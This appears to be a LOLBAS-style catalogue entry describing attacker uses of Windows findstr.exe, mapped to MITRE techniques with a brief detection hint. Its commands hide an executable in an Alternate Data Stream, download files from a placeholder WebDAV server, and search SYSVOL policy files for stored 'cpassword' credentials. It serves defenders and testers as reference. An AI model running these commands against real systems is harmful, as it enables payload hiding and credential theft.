---
Name: Findstr.exe
Description:
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
    Usecase: Add a file to an alternate data stream to hide from defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
    Usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: findstr /S /I cpassword \\sysvol\policies\*.xml
    Description: Search for stored password in Group Policy files stored on SYSVOL.
    Usecase: Find credentials stored in cpassword attrbute
    Category: Credentials
    Privileges: User
    MitreID: T1552.001
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
    Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
    Usecase: Download/Copy file from webdav server
    Category: Download
    Privileges: User
    MitreID: T1185
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\findstr.exe
  - Path: C:\Windows\SysWOW64\findstr.exe
Code_Sample:
- Code:
Detection:
 - IOC: findstr.exe should normally not be invoked on a client system
Resources:
  - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
